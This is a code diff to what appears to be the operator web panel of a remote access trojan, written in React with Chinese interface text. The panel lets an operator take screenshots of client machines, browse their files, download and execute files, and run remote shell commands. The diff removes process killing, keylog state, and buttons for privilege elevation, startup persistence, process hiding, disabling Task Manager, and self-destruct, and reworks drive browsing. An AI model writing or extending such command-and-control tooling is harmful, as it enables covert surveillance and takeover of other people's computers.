@@ -794,16 +794,12 @@ export default function Home() {
   const [selectedClient, setSelectedClient] = useState<any>(null)
   const [screenshotUrl, setScreenshotUrl] = useState('')
   const [screenViewActive, setScreenViewActive] = useState(false)
-  const [directoryItems, setDirectoryItems] = useState<Array<{name: string; path: string; type: string; size?: number}>>([])
+  const [directoryItems, setDirectoryItems] = useState<any[]>([])
   const [currentPath, setCurrentPath] = useState('')
   const [availableDrives, setAvailableDrives] = useState<string[]>([])
-  const [processes, setProcesses] = useState<any[]>([])
-  const [keylogContent, setKeylogContent] = useState('')
   const [remoteCommand, setRemoteCommand] = useState('')
   const [commandResult, setCommandResult] = useState('')
   const [commandType, setCommandType] = useState('cmd')
-  const [downloadProgress, setDownloadProgress] = useState('')
-  const [uploadFileName, setUploadFileName] = useState('')
 
   const fetchClients = async () => {
     try {
@@ -863,19 +859,24 @@ export default function Home() {
     try {
       await sendRemoteCommand(clientId, '', 'drives')
       setTimeout(async () => {
-        const cmdResponse = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
-        const cmdResult = await cmdResponse.json()
-        if (cmdResult.result) {
+        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
+        const result = await response.json()
+        if (result.status === 'success' && result.result) {
           try {
-            const drives = JSON.parse(cmdResult.result)
-            setAvailableDrives(drives)
-          } catch (e) {
-            console.error('解析磁盘列表失败:', e)
+            const data = JSON.parse(result.result.output)
+            if (data.drives) {
+              setAvailableDrives(data.drives)
+              if (data.drives.length > 0) {
+                getClientDirectory(clientId, data.drives[0])
+              }
+            }
+          } catch {
+            setAvailableDrives([])
           }
         }
-      }, 500)
+      }, 1500)
     } catch (error) {
-      console.error('获取磁盘列表失败:', error)
+      console.error('获取驱动器列表失败:', error)
     }
   }
 
@@ -906,32 +907,7 @@ export default function Home() {
     }
   }
 
-  const getClientProcesses = async (clientId: string) => {
-    try {
-      await sendRemoteCommand(clientId, '', 'processes')
-      setTimeout(async () => {
-        const response = await fetch(`/api/admin/remote?action=getResult&clientId=${clientId}`)
-        const result = await response.json()
-        if (result.status === 'success' && result.result) {
-          try {
-            const data = JSON.parse(result.result.output)
-            if (data.processes) {
-              setProcesses(data.processes)
-            }
-          } catch {
-            setProcesses([])
-          }
-        }
-      }, 2000)
-    } catch (error) {
-      console.error('获取进程失败:', error)
-    }
-  }
-
-  const killClientProcess = async (clientId: string, pid: number) => {
-    await sendRemoteCommand(clientId, pid.toString(), 'kill')
-    setTimeout(() => getClientProcesses(clientId), 1000)
-  }
+  
 
   const startScreenView = async (clientId: string) => {
     setScreenViewActive(true)
@@ -970,8 +946,7 @@ export default function Home() {
 
   const handleDownloadFile = (clientId: string, filePath: string) => {
     sendRemoteCommand(clientId, filePath, 'download')
-    setDownloadProgress(`正在下载: ${filePath}`)
-    setTimeout(() => setDownloadProgress(''), 3000)
+    showMessage(`正在下载: ${filePath}`, 'success')
   }
 
   const handleExecuteFile = (clientId: string, filePath: string) => {
@@ -987,54 +962,19 @@ export default function Home() {
   }
 
   const handleGoBack = () => {
-    if (currentPath && currentPath !== '.' && currentPath !== '/' && !currentPath.match(/^[A-Za-z]:\\?$/)) {
-      const parentPath = currentPath.substring(0, currentPath.lastIndexOf('\\')) || 'C:\\'
-      getClientDirectory(selectedClient!.id, parentPath)
+    if (!currentPath || currentPath === '.' || currentPath === '/') {
+      getClientDrives(selectedClient!.id)
+    } else if (!currentPath.match(/^[A-Za-z]:\\?$/)) {
+      const parentPath = currentPath.substring(0, currentPath.lastIndexOf('\\')) || ''
+      if (parentPath) {
+        getClientDirectory(selectedClient!.id, parentPath)
+      } else {
+        getClientDrives(selectedClient!.id)
+      }
     }
   }
 
-  const handleElevate = (clientId: string) => {
-    if (!selectedClient) {
-      showMessage('请先选择客户端', 'error')
-      return
-    }
-    sendRemoteCommand(clientId, '', 'elevate')
-    showMessage('已请求提权', 'success')
-  }
-
-  const handleAddStartup = (clientId: string) => {
-    if (!selectedClient) {
-      showMessage('请先选择客户端', 'error')
-      return
-    }
-    sendRemoteCommand(clientId, '', 'startup')
-    showMessage('已添加到开机启动', 'success')
-  }
-
-  const handleHideProcess = (clientId: string) => {
-    if (!selectedClient) {
-      showMessage('请先选择客户端', 'error')
-      return
-    }
-    sendRemoteCommand(clientId, '', 'hide')
-    showMessage('进程已隐藏', 'success')
-  }
-
-  const handleBlockTaskMgr = (clientId: string) => {
-    if (!selectedClient) {
-      showMessage('请先选择客户端', 'error')
-      return
-    }
-    sendRemoteCommand(clientId, '', 'block_taskmgr')
-    showMessage('任务管理器已禁用', 'success')
-  }
-
-  const handleSelfDestruct = (clientId: string) => {
-    if (!confirm('确定要让客户端自毁吗？此操作不可恢复！')) return
-    sendRemoteCommand(clientId, '', 'selfdestruct')
-    showMessage('客户端已自毁', 'success')
-    setTimeout(() => fetchClients(), 1000)
-  }
+  
 
   const handleRemoveClient = async (clientId: string, hostname: string) => {
     if (!confirm(`确定要删除客户端 "${hostname}" 吗？此操作将从服务端移除该客户端记录，但不会影响客户端本身。`)) return
@@ -1132,7 +1072,6 @@ export default function Home() {
                         setScreenshotUrl('')
                         setScreenViewActive(false)
                         setDirectoryItems([])
-                        setProcesses([])
                         setCommandResult('')
                       }}
                     >
@@ -1258,45 +1197,40 @@ export default function Home() {
                       <h3>
                         <i className="fas fa-folder-open"></i> 文件浏览
                       </h3>
-                      <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
-                        <select 
-                          className="form-control"
-                          onChange={(e) => {
-                            getClientDirectory(selectedClient.id, e.target.value)
-                          }}
-                          style={{ padding: '0.3rem', borderRadius: '4px' }}
-                        >
-                          <option value="">选择磁盘</option>
-                          {availableDrives.map((drive) => (
-                            <option key={drive} value={drive}>{drive}</option>
-                          ))}
-                        </select>
-                        <button 
-                          className="btn btn-sm" 
-                          onClick={() => getClientDrives(selectedClient.id)}
-                          style={{ background: '#1abc9c' }}
-                        >
-                          <i className="fas fa-refresh"></i> 刷新磁盘
-                        </button>
+                      <div style={{ display: 'flex', gap: '0.5rem' }}>
                         <button 
                           className="btn btn-sm" 
                           onClick={handleGoBack}
-                          disabled={!currentPath || currentPath === '.' || currentPath === '/' || !!currentPath.match(/^[A-Za-z]:\\?$/)}
-                          style={{ background: '#95a5a6', opacity: (!currentPath || currentPath === '.' || currentPath === '/' || !!currentPath.match(/^[A-Za-z]:\\?$/)) ? 0.5 : 1, cursor: (!currentPath || currentPath === '.' || currentPath === '/' || !!currentPath.match(/^[A-Za-z]:\\?$/)) ? 'not-allowed' : 'pointer' }}
+                          disabled={!currentPath}
+                          style={{ background: '#95a5a6', opacity: !currentPath ? 0.5 : 1, cursor: !currentPath ? 'not-allowed' : 'pointer' }}
                         >
                           <i className="fas fa-arrow-left"></i> 返回
                         </button>
                         <button 
                           className="btn btn-sm" 
-                          onClick={() => getClientDirectory(selectedClient.id, 'C:\\')}
+                          onClick={() => getClientDrives(selectedClient.id)}
                           style={{ background: '#3498db' }}
                         >
-                          <i className="fas fa-home"></i> 根目录
+                          <i className="fas fa-hard-drive"></i> 驱动器
                         </button>
                       </div>
                     </div>
+                    {availableDrives.length > 0 && (
+                      <div className="drive-selector">
+                        <span style={{ marginRight: '0.5rem', color: '#666' }}>选择驱动器:</span>
+                        {availableDrives.map((drive) => (
+                          <button 
+                            key={drive}
+                            className={`btn btn-sm drive-btn ${currentPath?.startsWith(drive) ? 'active' : ''}`}
+                            onClick={() => getClientDirectory(selectedClient.id, drive)}
+                          >
+                            {drive}
+                          </button>
+                        ))}
+                      </div>
+                    )}
                     <div className="path-bar">
-                      当前路径: {currentPath}
+                      当前路径: {currentPath || '未选择'}
                     </div>
                     <div className="file-browser">
                       {directoryItems.map((item, index) => (
@@ -1344,41 +1278,6 @@ export default function Home() {
                     </div>
                   </div>
 
-                  <div className="card processes-card">
-                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
-                      <h3>
-                        <i className="fas fa-cog"></i> 进程管理
-                      </h3>
-                      <button 
-                        className="btn" 
-                        onClick={() => getClientProcesses(selectedClient.id)}
-                        style={{ background: '#3498db' }}
-                      >
-                        <i className="fas fa-refresh"></i> 刷新进程
-                      </button>
-                    </div>
-                    <div className="process-list">
-                      {processes.map((proc) => (
-                        <div key={proc.pid} className="process-item">
-                          <div className="process-info">
-                            <span className="process-name">{proc.name}</span>
-                            <span className="process-pid">PID: {proc.pid}</span>
-                            <span className="process-user">{proc.username}</span>
-                          </div>
-                          <button 
-                            className="btn btn-sm danger" 
-                            onClick={() => killClientProcess(selectedClient.id, proc.pid)}
-                          >
-                            <i className="fas fa-times"></i> 结束
-                          </button>
-                        </div>
-                      ))}
-                      {processes.length === 0 && (
-                        <p style={{ textAlign: 'center', color: '#666', padding: '1rem' }}>点击刷新查看进程</p>
-                      )}
-                    </div>
-                  </div>
-
                   <div className="card command-card">
                     <h3>
                       <i className="fas fa-terminal"></i> 命令执行
@@ -1413,49 +1312,6 @@ export default function Home() {
                         <pre>{commandResult}</pre>
                       </div>
                     )}
-                  </div>
-
-                  <div className="card actions-card">
-                    <h3>
-                      <i className="fas fa-tools"></i> 高级操作
-                    </h3>
-                    <div className="action-buttons">
-                      <button 
-                        className="btn action-btn" 
-                        onClick={() => handleElevate(selectedClient.id)}
-                        style={{ background: '#f39c12' }}
-                      >
-                        <i className="fas fa-shield-alt"></i> 提权至管理员
-                      </button>
-                      <button 
-                        className="btn action-btn" 
-                        onClick={() => handleAddStartup(selectedClient.id)}
-                        style={{ background: '#2ecc71' }}
-                      >
-                        <i className="fas fa-power-off"></i> 添加到开机启动
-                      </button>
-                      <button 
-                        className="btn action-btn" 
-                        onClick={() => handleHideProcess(selectedClient.id)}
-                        style={{ background: '#9b59b6' }}
-                      >
-                        <i className="fas fa-eye-slash"></i> 隐藏进程
-                      </button>
-                      <button 
-                        className="btn action-btn" 
-                        onClick={() => handleBlockTaskMgr(selectedClient.id)}
-                        style={{ background: '#e74c3c' }}
-                      >
-                        <i className="fas fa-ban"></i> 禁止任务管理器
-                      </button>
-                      <button 
-                        className="btn action-btn danger" 
-                        onClick={() => handleSelfDestruct(selectedClient.id)}
-                        style={{ background: '#c0392b' }}
-                      >
-                        <i className="fas fa-bomb"></i> 自毁客户端
-                      </button>
-                    </div>
                   </div>
                 </div>
               ) : (
